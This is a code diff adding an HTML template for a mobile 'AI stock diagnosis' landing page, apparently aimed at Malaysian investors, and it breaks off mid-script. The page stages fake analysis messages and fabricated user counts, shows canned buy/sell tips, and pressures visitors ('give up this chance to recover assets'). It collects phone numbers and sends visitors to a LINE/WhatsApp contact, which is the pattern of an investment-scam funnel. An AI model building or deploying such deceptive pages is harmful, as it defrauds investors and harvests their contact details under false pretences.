@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<!-- saved from url=(0066)https://djagn.online/app/look/aebd6559-abd5-8e66-2af8-3d8d4d559b73 -->
+<html lang="en" style="font-size: 100px;">
+{{define "head"}}
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="bing-analysis-id" content="302r2z393c1d1f">
+    
+
+    <title>diagnostic stock</title>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)}(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '182317431322452');
+        fbq('init', '3539770416341693');
+        fbq('track', 'PageView');
+    </script>
+    <noscript>< img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=182317431322452&ev=PageView&noscript=1"
+        /></noscript>
+    <noscript>< img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=3539770416341693&ev=PageView&noscript=1"
+        /></noscript>
+
+    <!-- End Meta Pixel Code -->
+
+
+    <script type="application/javascript">
+    url_param = window.location.search
+    var gtag_id = ''
+    var gtag_conversion = '';
+
+    var app_id = '';
+    //号码区域
+    var number_id = '';
+    var number = '';
+    var app_prefix = '';
+    var web_prefix = '';
+    var platform_pkg_name = '';
+    var min_age = '';
+    if (isEmpty(min_age)) min_age = 0;
+    var max_age = '';
+    //默认号码区域
+    var default_number_id = '';
+    var default_number = '';
+    var default_app_prefix = '';
+    var default_web_prefix = '';
+    var default_platform_pkg_name = '';
+    var default_min_age = '';
+    if (isEmpty(default_min_age)) default_min_age = 0;
+    var default_max_age = '';
+    var is_with = '';
+    var tag = '';
+    var link_id = '';
+    var click_location = '';
+
+    var automatically = '';
+
+
+    var duration = 0; //停留时间
+    var loadingTime = 0; //加载时间
+    var startTime = Math.ceil(new Date().getTime() / 10);
+
+    //记录id
+    var record_id = 0;
+
+    //自动跳转
+    if (automatically > 0) {
+        setTimeout(function () {
+            toNext('compel')
+        }, automatically * 1000);
+    }
+
+    function checkApp(pkgName) {
+        try {
+            return mmo.mmoa(pkgName);
+        } catch (e) {
+        }
+        try {
+            return lp.la(pkgName);
+        } catch (e) {
+        }
+        return 0;
+    }
+
+    //点击按钮
+    function btnClick(url) {
+        // toGo();
+        // alert(url);
+        if (typeof(url) != 'undefined') {
+            url = url.slice(0, 4) !== 'http' ? 'http://'+ url : url
+            console.log('url --- ' + url)
+            window.location = url;
+        }
+        // if (type == 1) {
+        //     $('.button1').each((index, item) => {
+        //         if (item.id == id) {
+        //             click_location = index
+        //             return false
+        //         }
+        //     })
+        // } else if (type == 2) {
+        //     click_location = "bottom"
+        // } else if (type == 3) {
+        //     click_location = "float"
+        // } else if (type == 4) {
+        //     click_location = "pop_up"
+        // }
+        //
+        // if (min_age <= 0) {//不限制年龄
+        //     toGo();
+        // } else {//弹出年龄选项
+        //     setDomVisible("ageBgDiv", "flex");
+        // }
+    }
+
+    //dom显示状态控制
+    function setDomVisible(id, visible) {
+        console.log(id);
+        document.getElementById(id).style.display = visible;
+    }
+
+    //弹出加载窗口
+    function showLoading() {
+        var loading = document.getElementById("loading");
+        loading.style.display = "flex";
+        setTimeout(function () {
+            loading.style.display = "none";
+        }, 3000);
+    }
+
+    //选择年龄
+    function ageChoose(age) {
+        try {
+            showLoading();
+            setDomVisible("ageBgDiv", "none");
+            if (!isEmpty(min_age) && age < min_age) {
+                if (!isEmpty(default_min_age) && age < default_min_age) {//提示不符合要求
+                    setDomVisible("tipBgDiv", "flex");
+                } else {
+                    toGoDefault();
+                }
+            } else {
+                toGo();
+            }
+        } catch (e) {
+            setDomVisible("tipBgDiv", "flex");
+        }
+    }
+
+    //前往号码
+    function toGo() {
+        try {
+            if (isEmpty(number)) throw DOMException();
+            uploadClick(number_id);
+            //todo 前往号码
+            window.location.href = (is_with == 1 ? tag : "") + (checkApp(platform_pkg_name) == 1 ? app_prefix : web_prefix) + number;
+            toDelayHref();
+        } catch (e) {
+            toGoDefault();
+        }
+    }
+
+    //前往默认
+    function toGoDefault() {
+        try {
+            if (isEmpty(default_number)) throw DOMException();
+            uploadClick(default_number_id);
+            window.location.href = (is_with == 1 ? tag : "") + (checkApp(default_platform_pkg_name) == 1 ? default_app_prefix : default_web_prefix) + default_number;
+            toDelayHref();
+        } catch (e) {
+            setDomVisible("tipBgDiv", "flex");
+        }
+    }
+
+    //跳转延迟
+    function toDelayHref() {
+        var delay_href = '';
+        if (delay_href) setTimeout("window.location.href=''", 5000)
+    }
+
+    //记录点击
+    function uploadClick(m_number_id) {
+        param = {
+            "app_id": app_id,
+            "number_id": m_number_id,
+            "link_id": link_id,
+            'click_type': "click",
+            'location': click_location,
+            'duration': duration,
+            'record_id': record_id,
+            'is_with':is_with
+        }
+        postData("../../api/app/click", param).then(rsp => {
+            record_id = 0
+            console.log(rsp.code);
+        });
+    }
+
+    function toNext(type = 'auto') {
+        param = {
+            "app_id": app_id,
+            "number_id": number_id,
+            "link_id": link_id,
+            'click_type': type,
+            'location': click_location,
+            'duration': duration,
+            'record_id': record_id,
+            'is_with':is_with
+        }
+        postData("../../api/app/click", param).then(rsp => {
+            record_id = 0
+            console.log(rsp);
+        });
+        window.location.href = (is_with == 1 ? tag : "") + (checkApp(platform_pkg_name) == 1 ? app_prefix : web_prefix) + number;
+    }
+
+    //异步请求
+    function postData(url, data) {
+        var formData = [];
+        for (var key in data) {
+            formData.push(''.concat(key, '=', data[key]));
+        }
+        return fetch(url, {
+            body: formData.join('&'),
+            headers: {
+                'Accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded'
+            },
+            method: 'POST'
+        }).then(response => {
+            if (response.ok) {
+                return response.json();
+            } else {
+                return {"code": -1};
+            }
+        })
+    }
+
+    //判断是否为空
+    function isEmpty(obj) {
+        if (typeof obj == "undefined" || obj == null || obj == "") {
+            return true;
+        } else {
+            return false;
+        }
+    }
+</script>
+
+<script async="" src="/api/temp-statics/statics/stockMalaysia/znzp_files/js"></script>
+<script src="/api/temp-statics/statics/stockMalaysia/znzp_files/jquery-3.1.1.min.js"></script>
+
+
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    if (gtag_id != null && gtag_id.length > 0 && gtag_id != 'null') {
+        gtag('js', new Date());
+        gtag('config', gtag_id);
+    }
+
+    function conversion() {
+        if (gtag_conversion != null && gtag_conversion.length > 0 && gtag_conversion != 'null') {
+            gtag('event', 'conversion', {'send_to': gtag_conversion});
+        }
+    }
+</script>
+
+    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="keywords" content="智能診股">
+    <meta name="description" content="智能診股">
+    <link rel="stylesheet" type="text/css" href="/api/temp-statics/statics/stockMalaysia/znzp_files/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/api/temp-statics/statics/stockMalaysia/znzp_files/style-mlxy.css">
+    <script type="text/javascript">
+        function get_size() {
+            let _size = 100 * innerWidth / 750;
+            if (_size > 100) {
+                _size = 100;
+            }
+            return _size;
+        }
+        document.documentElement.style.fontSize = get_size() + "px",
+            addEventListener("load",
+                function () {
+                    setTimeout(function () {
+                        document.documentElement.style.fontSize = get_size() + "px",
+                            window.unit = get_size();
+                        var n = document.createEvent("Event");
+                    },
+                        480)
+                }),
+            addEventListener("orientationchange",
+                function () {
+                    setTimeout(function () {
+                        document.documentElement.style.fontSize = get_size() + "px"
+                    },
+                        480)
+                });
+    </script>
+    <script async="" src="/api/temp-statics/statics/stockMalaysia/znzp_files/js.js"></script>
+<link rel="stylesheet" href="/api/temp-statics/statics/stockMalaysia/znzp_files/layer.css" id="layui_layer_skinlayercss" style="">
+{{end}}
+
+{{define "body"}}
+
+    <div class="cnname" hidden="hidden"></div>
+    <a href="https://line.me/ti/p/~cc8631" id="sjlines" style="display: none;"></a>
+    <a href="https://djagn.online/app/look/aebd6559-abd5-8e66-2af8-3d8d4d559b73" style="display:none;" id="tttlink"></a>
+    <div class="loadBox2" id="loadBox2">
+        <div class="load_title2">
+            <div class="load_bod">
+                <span class="ico1"></span>
+                <span class="ico2"></span>
+                <span class="ico3"></span>
+            </div>
+            <div class="load_discuss2">
+                <p>Analyzing<span class="loadName"></span>......</p>
+                <p>Docking exchange database......</p>
+                <p>Scan Research Report......</p>
+                <p>Analyze recent money flows.....</p>
+                <p>Intelligent forecast K line.......</p>
+                <p>Search company and industry recent major news.......</p>
+            </div>
+        </div>
+    </div>
+    <!--挽留-->
+    <div class="confirm_stay" id="confirm_stay" style="display:none;">
+        <p class="confirm_stay_txt">Are you sure you don't want to see the<span class="cName">Zhulian Corp</span>forecast report?</p>
+        <p class="confirm_refuse"></p>
+        <p class="confirm_accept"></p>
+    </div>
+    <div class="detain" data-src="imgs/detain.png">
+        <div class="circle7"></div>
+        <input class="detain_input center" placeholder="輸入接收短信手機號碼" maxlength="11" type="tel">
+        <div class="detain_btn" zf_dataturn="Wait-wanliuye" id="detain_btn">免費領取當紅飆升股</div>
+    </div>
+
+    <div class="dialog5" data-src="imgs/dialog5.png">
+        <div class="circle5"></div>
+        <div class="results center">
+            <p class="cName">Zhulian Corp</p>
+            <p class="dialog5_txt"><span class="yearTime">2023</span>年目標價已調取完成</p>
+        </div>
+        <div class="target"><span><span class="yearTime">2023</span>年目標價：</span><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/mi1.png" alt="">
+        </div>
+        <div class="buying"><span style="color: #e62326;">買點：</span><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/mi1.png" alt=""><span style="color: #048be9;">賣點：</span><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/mi2.png" alt=""></div>
+        <p class="dialog5_prompt">Each number can only get one free chance</p>
+        <input class="dialog5_input center" placeholder="請輸入接收短信手機號碼" maxlength="11" type="tel" name="mobile" id="dialog5_input">
+        <div class="dialog5_btn   center bold" id="dialog5_btn">免費領取</div>
+        <div class="promise center">鄭重承諾：絕不泄露您的個人信息</div>
+    </div>
+    <div class="dialog4" data-src="Images/dialog4.png">
+        <div class="circle4"></div>
+        <div class="result center"><span class="cName">Zhulian Corp</span><span class="s-zg-res"></span> </div>
+        <p class="prompt  top35">Each number can only get one free chance</p>
+        <input class="dialog4_input center" placeholder="請輸入接收短信手機號碼" maxlength="11" type="tel" name="mobile" id="dialog4_input">
+        <div class="dialog4_btn  pulse animated infinite  center bold" id="tg_btn4145">View Now<span class="cName">Zhulian Corp</span>Forecast Report</div>
+<!--        <div class="promise center">-->
+<!--             You are the<span class="red no_number" id="no_number">4067</span>stockholder who checked the<span class="cName red">Zhulian Corp</span>forecast report today-->
+<!--        </div>-->
+    </div>
+    <div class="dialog3" style="background-image: url(&#39;https://www.makemoneyonlineok.xyz/static22/2023/tw/gp/0223/01/img/dialog4.png&#39;)">
+        <div class="circle6"></div>
+        <div class="result center" style="font-size: 0.42rem;">
+            <p class="cName" style="margin-bottom:20px;">Zhulian Corp</p>
+            <p class="dialog3_txt"><span class="btnBg_time"></span>The prediction report has been retrieved and completed......</p>
+        </div>
+        <p class="prompt top35">Each user has only one chance to claim</p>
+        <!-- <input class="dialog3_input center" placeholder="請輸入接收短信手機號碼" maxlength="11" type="tel" name="mobile" id="dialog3_input"/> -->
+<!--        <a style="text-decoration:none;" title="LINE號" href="javascript:void(0);">-->
+        </a><a onclick="btnClick('{{ .clickUrl }}')" target="_blank">
+            <span class="dialog3_btn pulse animated infinite center bold" style="display:block;" name="postMobile">Add WS Get Stock  Report</span>
+        </a>
+        <div class="promise center">
+             You are the<span class="red no_number" id="no_number1">4067</span>stockholder who checked the<span class="cName red">Zhulian Corp</span>forecast report today
+        </div>
+    </div>
+    <!--维度申请-->
+    <div class="dimension" data-src="imgs/dimension.png">
+        <div class="circle3"></div>
+        <div class="dimension_msg center">
+            <p class="cName">Zhulian Corp</p>
+            <p class="dimension_txt">stock review results</p>
+            <p class="dimension_txt1">何時漲？漲多少？</p>
+        </div>
+        <p class="prompt">Each number can only get one free chance</p>
+        <input class="dimension_input center" placeholder="請輸入接收短信手機號碼" maxlength="11" type="tel" name="mobile" id="mobile1">
+        <div class="dimension_btn center bold" id="dimensionBtn1" name="postMobile">免費領取</div>
+        <div class="promise center">鄭重承諾：絕不泄露您的個人信息</div>
+    </div>
+    <div class="zhegai"></div>
+    <div class="main">
+        <!-- <p class="font">投資有風險，入市需謹慎</p> -->
+        <div class="roll"></div>
+        <div class="content">
+            <div class="head">
+                <div class="row">
+                    <div class="head_search" data-name="searchInputBoxs">
+                        <input type="text" class="search_ipt" id="gp" placeholder="stock code" maxlength="6" data-name="searchStockName" autocomplete="off">
+                        <input type="button" class="search_btn" value="Diagnostic" data-name="diagBtn" data-bs="stockInput1">
+                        <div class="ip-show" data-name="showSearchInfo">
+                            <div class="ips-t"><span>stock code</span><span>stock name</span></div>
+                            <ul></ul>
+                        </div>
+                    </div>
+
+                    <div class="gupiao">
+                        <div class="t1">
+                            <div class="gName cnname">Zhulian Corp</div>
+                            <div class="gCode center">(ZHCO)</div>
+                        </div>
+
+                    </div>
+
+                </div>
+            </div>
+            <div class="body">
+                <div class="imgContent center">
+                    <p class="logo_ico"></p>
+<!--                    <h2 class="imgContent_title">lose money if you buy it？Sell it and immediately go up</h2>-->
+<!--                    <p class="hot"></p>-->
+                    <div class="dimension_box">
+                        <div class="dimension_name">
+<!--                            <h3 class="dimensionName gName">Zhulian Corp</h3>-->
+                            <h3 class="dimensionTxt">Stock Go Up?</h3>
+                        </div>
+                        <div class="dimension_bg">
+                            <p class="p1 newBtn2" zf_datanum="Five-hbhz" zf_dataevent="Five-hbhz" zf_dataturn="Five-hbhz" id="ZGMZG_dimensionBtn1"><i></i>Stock Go Up</p>
+                            <p class="p2 newBtn2" zf_datanum="Five-zxxx" zf_dataevent="Five-zxxx" zf_dataturn="Five-zxxx" id="ZGMZG_dimensionBtn2"><i></i>Latest News</p>
+                            <p class="p3 newBtn2" zf_datanum="Five-ftsj" zf_dataevent="Five-ftsj" zf_dataturn="Five-ftsj" id="ZGMZG_dimensionBtn3"><i></i><span class="p3_txt">Oversold Rebound Time</span></p>
+                            <p class="p4 newBtn2" zf_datanum="Five-mbj" zf_dataevent="Five-mbj" zf_dataturn="Five-mbj" id="ZGMZG_dimensionBtn4"><i></i>Target Price</p>
+                            <p class="p5 newBtn2" zf_datanum="Five-zjmmd" zf_dataevent="Five-zjmmd" zf_dataturn="Five-zjmmd" id="ZGMZG_dimensionBtn5"><i></i><span class="p5_txt">Buying & Selling</span></p>
+                        </div>
+                    </div>
+                </div>
+                <div class="form formBlock">
+                    <div class="btnBg center pulse animated infinite" zf_datanum="Main-ycbg" zf_dataevent="Main-ycbg" zf_dataturn="Main-ycbg" id="btnBg_"> View Now<span class="gpName">Zhulian Corp</span> Forecast Report</div>
+                    <p style="padding-left: 0.15rem;margin: 0 auto;display: block;width: 7.5rem;margin-top: -0.2rem;">
+                        <img style=" width: 4.07rem;height: 0.55rem;" src="/api/temp-statics/statics/stockMalaysia/img-mlxy/zrzdgpjg.png" alt="">
+                    </p>
+                    <div class="tableBg">
+                        <div class="tableCon">
+                            <table class="sharesList" style="margin-top: -1.32rem; transition: all 0.7s ease 0s;">
+                                <tbody>
+                                <tr>
+                                    <td class="tdFrist">T**H</td>
+                                    <td class="tdLast">
+                                        <span>  The Current Price Is Available For Purchase, And The Sell Price Is At XXX</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="tdFrist">S**K</td>
+                                    <td class="tdLast">
+                                        <span>  The Stock Price Is Low, It Can Be Bought Appropriately</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="tdFrist">T**B</td>
+                                    <td class="tdLast">
+                                        <span>  The Triangle Area Has Been Broken And Can Be Entered</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="tdFrist">R**G</td>
+                                    <td class="tdLast">
+                                        <span>  It is Not Recommended To Operate At Present, Waiting For The Bottoming Signal</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="tdFrist">Q**S</td>
+                                    <td class="tdLast">
+                                        <span>  There Is No Sign Of A Rebound, Waiting For An Entry Opportunity</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="tdFrist">P**T</td>
+                                    <td class="tdLast">
+                                        <span> Shareholders Continue To Sell, Bearish In The Later Stage</span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="tdFrist">P**E</td>
+                                    <td class="tdLast">
+                                        <span>  Long-term Sideways, Now Suitable For Entry</span>
+                                    </td>
+                                </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!--<input class="newBtn_input center" placeholder="请输入手机号码,5秒得结果" maxlength="11" type="tel">-->
+                    <div class="newBtn center pulse animated infinite" zf_datanum="Main-zdbg" zf_dataevent="Main-zdbg" zf_dataturn="Main-zdbg" id="jt_btn4s4">View Now<span class="gpName">Zhulian Corp</span><span class="trend_txt"><span class="btnBg_time"></span> Forecast Report</span></div>
+                    <div class="table2bg">
+                        <div class="table2Overflow">
+                            <table style="margin-top: 0px; transition: none 0s ease 0s;">
+                                <tbody>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60****5364analysis complete <span style="color: #d50404">   ECOD</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60****2745analysis complete <span style="color: #d50404">   DOMN</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60****0053analysis complete <span style="color: #d50404">   CSTH</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60****8848analysis complete <span style="color: #d50404">   BJFO</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60****2537analysis complete <span style="color: #d50404">  ANRE</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60***1127analysis complete <span style="color: #d50404">     SEVE</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="td0"><img src="/api/temp-statics/statics/stockMalaysia/znzp_files/user.jpeg">user
+                                        60****5235nalysis complete <span style="color: #d50404">    GREA</span></td>
+                                </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                    </div>
+                    <div data-name="searchInputBoxs">
+                        <div class="inputBgb" style="margin-top: 0.4rem;">
+                            <input type="text" autocomplete="false" class="phoneb search_ipt" maxlength="6" placeholder=" stock code" data-name="searchStockName" id="gp2">
+                            <div class="ip-show" data-name="showSearchInfo">
+                                <div class="ips-t"><span>stock code</span><span>stock name</span></div>
+                                <ul></ul>
+                            </div>
+                        </div>
+                        <div class="btnBgb center" zf_datanum="Main-ljzg" zf_dataevent="Main-ljzg" zf_dataturn="Main-ljzg" data-name="diagBtn" id="btnBg_b" data-bs="stockInput2">Start</div>
+                        <p class="center tips">Each number can only get one free chance</p>
+                    </div>
+                    <div class="center" style="color: #696363;margin-top:0.36rem;font-size: 0.24rem;line-height:0.35rem;">
+                        <span class="RecordNumber"> Investment is risky, you need to be cautious when entering the market</span><br>
+                        <span>Engaging in securities investment and futures trading shall be conducted through legal securities and futures operating institutions.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="banner_a" id="bannerAd_btn">
+        <span class="closeM"></span>
+        <span class="bannerM_box newBtn2"></span>
+        <p class="banner_p1 banner_code"></p>
+<!--        <p class="banner_p2 banner_code"></p>-->
+    </div>
+
+    <div class="banner_window" id="banner_window">
+        <div class="banner_close"></div>
+        <div class="banner_window_name">
+            <p class="banner_code">Zhulian Corp</p>
+            <p class="banner_window_txs">短線買賣點已提取成功</p>
+        </div>
+        <p class="banner_codeName2"><span class="banner_code">Zhulian Corp</span>:</p>
+        <p class="banner_prompt">為保障用護真實性及數據安全<br>請輸入手機號驗證後查看</p>
+        <input class="banner_input center" placeholder="輸入手機號" maxlength="10" type="tel" name="mobile" id="banner_input">
+        <div class="banner_btn center bold" id="btn_tg8"></div>
+        <div class="promise center promise_color2">鄭重承諾：絕不泄露用護的個人信息</div>
+    </div>
+
+    <div class="banner_stay" id="banner_stay">
+        <p class="banner_stay_txt">您確定要放棄這次讓<span>資產回本</span>的機會嗎？</p>
+        <p class="banner_accept"></p>
+        <p class="banner_refuse"></p>
+    </div>
+
+    <div style="display: none;">
+        <img src="/api/temp-statics/statics/stockMalaysia/znzp_files/arrow.png" id="arrowIcon">
+        <img src="/api/temp-statics/statics/stockMalaysia/znzp_files/arrowdown.png" id="arrowdownIcon">
+    </div>
+
+    <input type="hidden" name="stock" value="AJ" id="stock-input">
+    <input value="824" id="gid" name="gid" type="hidden">
+    <input value="435" id="aid" name="aid" type="hidden">
+    <input value="1" id="pid" name="pid" type="hidden">
+    <input value="274" id="channelid" name="channelid" type="hidden">
+    <input value="cc8631" id="pro_msg" name="pro_msg" type="hidden">
+
+    <script type="text/javascript" src="/api/temp-statics/statics/stockMalaysia/znzp_files/jquery-1.7.2.min.js"></script>
+    <script src="/api/temp-statics/statics/stockMalaysia/znzp_files/layer.js"></script>
+    <script src="/api/temp-statics/statics/stockMalaysia/znzp_files/data-code-mlxy.js"></script>
+    <script src="/api/temp-statics/statics/stockMalaysia/znzp_files/code-role.js"></script>
+    <script src="/api/temp-statics/statics/stockMalaysia/znzp_files/index-mlxy.js"></script>
+
+
+    <script type="text/javascript">
+        $(function () {
+            var ztIndex = {
+                domainurl: $.trim($('[name=domainurl]').val()),
+                init: function () {
+                    // 插件初始化回调
+                    if (typeof plugInitCallback == 'function') {
+                        plugInitCallback && plugInitCallback();
+                    }
+                    this.eventfn();
+                },
+                eventfn: function () {
+                    var _this = this;
+                    // 下拉搜索
+                    $('[data-name=searchStockName]').on('input', function () {
+                        var searchInputBoxs = $(this).closest('[data-name=searchInputBoxs]');
+                        var val = $.trim($(this).val());
+                        if (val.length > 0) {
+                            var liNode = _this.matchingStockCodeAndName(val);
+                            if (liNode != '') {
+                                searchInputBoxs.find('[data-name=showSearchInfo]').show().find(
+                                    'ul').html(liNode);
+                            } else {
+                                searchInputBoxs.find('[data-name=showSearchInfo]').hide();
+                            }
+                        } else {
+                            searchInputBoxs.find('[data-name=showSearchInfo]').hide();
+                        }
+
+                    });
+
+                    // 下拉搜索-股票代號点击
+                    $('body').on('click', '[data-name=codeName]', function () {
+
+                        var $this = $(this),
+                            type = $this.attr('data-type'),
+                            code = $this.attr('data-code'),
+                            name = $this.attr('data-cname'),
+                            $sbox = $this.closest('[data-name=searchInputBoxs]'),
+                            id = $sbox.attr('data-id'),
+                            val = type === 'code' ? code : name;
+                        // 交互
+                        $sbox.closest('[data-name=searchInputBoxs]').find('input.search_ipt').val(val).end().find('[data-name=showSearchInfo]').hide();
+                        var cNum = $(this).attr("data-code");
+                        var infoArr = queryStock(cNum);
+                        if (cNum == '' || !checkData(s, "c", infoArr.c)) {
+                            layer.msg('請輸入正確的股票代號');
+                            return false;
+                        } else {
+                            getCodeInfo(infoArr.c, infoArr.n);
+                        }
+                    });
+
+                    // 诊断
+                    //显示模拟检测
+
+                    $('.btnBg').on('click', function () {
+                        if ($(".trend_txt").eq(0).text() == "復牌走勢預測") {
+                            note = getThisTime() + "復牌走勢預測";
+                            report_txt = "復牌走勢預測";
+                        } else {
+                            note = getThisTime() + "預測報告";
+                            report_txt = "預測報告";
+                        }
+                        var codeName = $(".gpName").eq(0).text();
+                        changeSpeedTxt(1, codeName);
+                        aloneLoad($(".dialog3,.zhegai"));
+                    });
+
+
+                    $('.newBtn').on('click', function () {
+
+                        if ($(".trend_txt").eq(1).text() == "復牌走勢預測") {
+                            note = getThisTime() + "復牌走勢預測B";
+                            report_txt = "復牌走勢預測";
+                        } else {
+                            note = getThisTime() + "預測報告B";
+                            report_txt = "預測報告";
+                        }
+                        var codeName = $(".gpName").eq(0).text();
+                        changeSpeedTxt(1, codeName);
+                        aloneLoad($(".dialog3,.zhegai"));
+                    });
+
+                    $('.newBtn2').on('click', function () {
+
+                        if ($(".trend_txt").eq(1).text() == "復牌走勢預測") {
+                            note = getThisTime() + "復牌走勢預測B";
+                            report_txt = "復牌走勢預測";
+                        } else {
+                            note = getThisTime() + "預測報告B";
+                            report_txt = "預測報告";
+                        }
+                        var codeName = $(".gpName").eq(0).text();
+                        changeSpeedTxt(1, codeName);
+                        aloneLoad($(".dialog3,.zhegai"));
+                    });
+
+                    $(window).scroll(function () {
+                        var scrolltop = $(window).scrollTop();
+                        if (scrolltop <= 460) {
+                            $("#bannerAd_btn").css({ "display": "none" });
+                        } else {
+                            $("#bannerAd_btn").css({ "display": "block" });
+                            $(".main").css({ "padding-bottom": "2.5rem" });
+                        }
+                    });
+                    $("#bannerAd_btn .closeM").click(function () {
+                        $("#bannerAd_btn").hide();
+                        $(".main").css({ "padding-bottom": "0.8rem" });
+                    });
+
+
+
+                    $(".banner_close").click(function () {
+                        $("#banner_window").hide();
+                        $("#banner_stay").show();
+                    });
+
+                    $("#banner_stay .banner_accept").click(function () {
+                        $("#banner_stay").hide();
+                        $("#banner_window,.zhegai").show();
+                    });
+
+                    $("#banner_stay .banner_refuse").click(function () {
+                        $("#banner_window,.zhegai").hide();
+                        $("#banner_stay").hide();
+                    })
+                    $('[data-bs=stockInput1]').on('click', function () {
+                        var inputs = $.trim($("#gp").val());
+                        if (inputs == '') {
+                            layer.msg('未檢測到股票代號或名稱');
+                            return false;
+                        }
+                        var infoArr = queryStock(inputs);
+                        if (cNum == '' || !checkData(s, "c", infoArr.c)) {
+                            layer.msg('請輸入正確的股票代號');
+                            return false;
+                        } else {
+                            getCodeInfo(infoArr.c, infoArr.n);
+                        }
+                        if ($(".trend_txt").eq(1).text() == "復牌走勢預測") {
+                            note = getThisTime() + "復牌走勢預測B";
+                            report_txt = "復牌走勢預測";
+                        } else {
+                            note = getThisTime() + "預測報告B";
+                            report_txt = "預測報告";
+                        }
+                        var codeName = $(".gpName").eq(0).text();
+                        changeSpeedTxt(1, codeName);
+                        aloneLoad($(".dialog3,.zhegai"));
+                    });
+                    $('[data-bs=stockInput2]').on('click', function () {
+                        var cNum = $.trim($("#gp2").val());
+                        if (cNum == '' || !checkData(s, "c", cNum)) {
+                            layer.msg("Please Check");
+
+                            return false;
+                        }
+                        // var codeName = $(".gpName").eq(0).text();
+                        // saveMobile();
+                        // changeSpeedTxt(1,codeName);
+                        // aloneLoad($(".dialog3,.zhegai"));
+                        var codeName = $(".gpName").eq(0).text();
+                        changeSpeedTxt(1, codeName);
+                        aloneLoad($(".dialog3,.zhegai"));
+                    });
+
+                    // 诊断弹窗提交
+                    var ajaxtype = false;
+                    $("#dimensionBtn1").click(function () {
+                        var myreg = /^1(3|4|5|6|7|8|9)\d{9}$/;
+                        var mobile = $('#mobile1').val();
+                        if (ajaxtype) {
+                            return;
+                        }
+                        if (!myreg.test(mobile)) {
+                            layer.msg('請輸入有效的手機號碼');
+                            return false;
+                        }
+                        ajaxtype = true;
+                        // 提交前回调
+                        if (typeof plugBeforeSaveCallback == 'function') {
+                            plugBeforeSaveCallback && plugBeforeSaveCallback();
+                        }
+                        ajaxfn(mobile)
+                    });
+                    $("#dialog5_btn").click(function () {
+                        var myreg = /^1(3|4|5|6|7|8|9)\d{9}$/;
+                        var mobile = $('#dialog5_input').val();
+                        if (ajaxtype) {
+                            return;
+                        }
+                        if (!myreg.test(mobile)) {
+                            layer.msg('請輸入有效的手機號碼');
+                            return false;
+                        }
+                        ajaxtype = true;
+                        // 提交前回调
+                        if (typeof plugBeforeSaveCallback == 'function') {
+                            plugBeforeSaveCallback && plugBeforeSaveCallback();
+                        }
+                        ajaxfn(mobile)
+                    });
+                    $("#dialog3_btn").click(function () {
+                        var myreg = /^1(3|4|5|6|7|8|9)\d{9}$/;
+                        var mobile = $('#dialog3_input').val();
+                        if (ajaxtype) {
+                            return;
+                        }
+                        if (!myreg.test(mobile)) {
+                            layer.msg('請輸入有效的手機號碼');
+                            return false;
+                        }
+                        ajaxtype = true;
+                        // 提交前回调
+                        if (typeof plugBeforeSaveCallback == 'function') {
+                            plugBeforeSaveCallback && plugBeforeSaveCallback();
+                        }
+                        ajaxfn(mobile);
+                    });
+                    $("#btn_tg8").click(function () {
+                        var myreg = /^1(3|4|5|6|7|8|9)\d{9}$/;
+                        var mobile = $('#banner_input').val();
+                        if (ajaxtype) {
+                            return;
+                        }
+                        if (!myreg.test(mobile)) {
+                            layer.msg('請輸入有效的手機號碼');
+                            return false;
+                        }
+                        ajaxtype = true;
+                        // 提交前回调
+                        if (typeof plugBeforeSaveCallback == 'function') {
+                            plugBeforeSaveCallback && plugBeforeSaveCallback();
+                        }
+                        ajaxfn(mobile)
+                    });
+                    $("#tg_btn4145").click(function () {
+                        var myreg = /^1(3|4|5|6|7|8|9)\d{9}$/;
+                        var mobile = $('#dialog4_input').val();
+                        if (ajaxtype) {
+                            return;
+                        }
+                        if (!myreg.test(mobile)) {
